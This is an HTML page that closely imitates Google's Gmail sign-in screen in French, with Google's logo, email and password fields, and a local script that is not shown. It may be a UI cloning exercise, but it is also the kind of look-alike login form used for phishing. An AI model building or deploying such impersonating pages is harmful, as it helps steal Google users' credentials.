<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./dist/style.css">
    <title>Document</title>
</head>

<body>
    <div class="body">
        <div class="body__left">
            <div class="body__left__header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="" srcset="">
                <h3>Connexion</h3>
                <p>Accéder à GMAIL</p>
            </div>
            <div class="body__left__body">
                <input id="email" type="text" placeholder="Adresse email ou numéro de téléphone">
                <input id="password" type="password" placeholder="mot de passe">
                <a href="#">Adresse e-mail oubliée ?</a>
                <p>S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé.
                </p>
            </div>
            <div class="body__left__footer">
                <a href="#"> Crée un compte</a>
                <button id="button">Suivant</button>
            </div>
        </div>
        <div class="body__right">
            <img src="https://ssl.gstatic.com/accounts/signup/glif/account.svg" alt="" srcset="">
        </div>
    </div>
    <script src="./dist/script.js"></script>
</body>

</html>
